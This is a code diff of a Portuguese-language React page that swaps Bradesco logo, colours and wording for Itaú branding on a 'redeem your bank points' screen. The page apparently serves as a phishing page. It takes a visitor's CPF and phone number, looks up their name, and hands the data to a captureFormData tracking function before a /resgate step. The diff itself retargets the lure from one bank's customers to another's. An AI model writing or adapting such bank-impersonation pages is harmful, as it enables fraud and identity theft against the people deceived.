@@ -2,7 +2,7 @@ import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import AttentionModal from "@/components/AttentionModal";
-import bradescoLogo from "@/assets/bradesco-logo.png";
+import itauLogo from "@/assets/itau-logo.png";
 import BottomNav from "@/components/BottomNav";
 import { supabase } from "@/integrations/supabase/client";
 import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
@@ -43,7 +43,7 @@ const Index = () => {
   }, [cpf]);
 
   return (
-    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
+    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FE5200 0%, #CC4200 100%)' }}>
       {/* Header */}
       <div className="px-5 pt-6 pb-16">
         <div className="flex items-center justify-between mb-8">
@@ -52,7 +52,7 @@ const Index = () => {
         </div>
         <div className="flex flex-col items-center gap-3">
           <div className="text-primary-foreground text-2xl font-bold tracking-wide">
-            <img src={bradescoLogo} alt="Bradesco" className="h-8" />
+            <img src={itauLogo} alt="Itaú" className="h-12" />
           </div>
           <p className="text-primary-foreground/80 text-sm">
             Você possui pontos para resgate
@@ -98,20 +98,20 @@ const Index = () => {
         </div>
 
         {/* Nome do titular */}
-        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#D7004D]"}`}>
+        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#FE5200]"}`}>
           {consultando ? "Consultando..." : cpfErro ? cpfErro : nomeCompleto ? nomeCompleto : "1º titular"}
         </div>
 
         {/* Toggle */}
         <div className="flex items-center justify-between px-1">
-          <span className="text-sm font-medium text-primary-foreground">Resgatar pontos Bradesco</span>
+          <span className="text-sm font-medium text-primary-foreground">Resgatar pontos Itaú</span>
           <button
             onClick={() => setToggleOn(!toggleOn)}
             className={`w-12 h-7 rounded-full transition-colors relative flex-shrink-0 ${toggleOn ? "bg-primary-foreground" : "bg-primary-foreground/30"}`}
           >
             <span
               className={`absolute top-[3px] left-[3px] w-[22px] h-[22px] rounded-full shadow transition-transform ${
-                toggleOn ? "translate-x-[18px] bg-[#D7004D]" : "translate-x-0 bg-primary-foreground/60"
+                toggleOn ? "translate-x-[18px] bg-[#FE5200]" : "translate-x-0 bg-primary-foreground/60"
               }`}
             />
           </button>
@@ -121,7 +121,7 @@ const Index = () => {
         <button
           onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
-          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
+          className="w-full py-4 rounded-full bg-white text-[#FE5200] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
           continuar para resgate
         </button>
